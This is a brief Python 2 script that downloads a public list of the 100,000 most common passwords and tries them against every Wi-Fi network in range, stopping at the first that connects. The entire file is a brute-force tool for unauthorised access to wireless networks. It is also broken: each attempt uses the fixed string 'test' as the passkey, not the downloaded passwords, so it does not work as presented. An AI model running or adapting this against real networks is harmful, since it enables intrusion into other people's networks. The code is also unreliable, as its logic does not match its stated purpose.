#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import urllib2

from wifi import Cell, Scheme, exceptions

# need `sudo` to show all networks
if __name__ == '__main__':

	# download most used passwords on github.com and build a dict
	url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt"
	response = urllib2.urlopen( url )
	txt = response.read()
	passwords = txt.splitlines()

	print(len(passwords))

	networks = Cell.all('wlan0')

	nb_test = 0

	for password in passwords:

		for cell in networks:

				try:
					scheme = Scheme.for_cell('wlan0', 'home', cell, 'test')
					scheme.activate()
					print("Connect to {} with `{}` passkey works!!".format(cell, 'test'))
					sys.exit(0)
				except exceptions.ConnectionError as e:
					pass
				finally:
					nb_test += 1

				sys.stdout.write('\rtest n°{}'.format( nb_test ))
				sys.stdout.flush()

	print("you are not lucky :'(")
		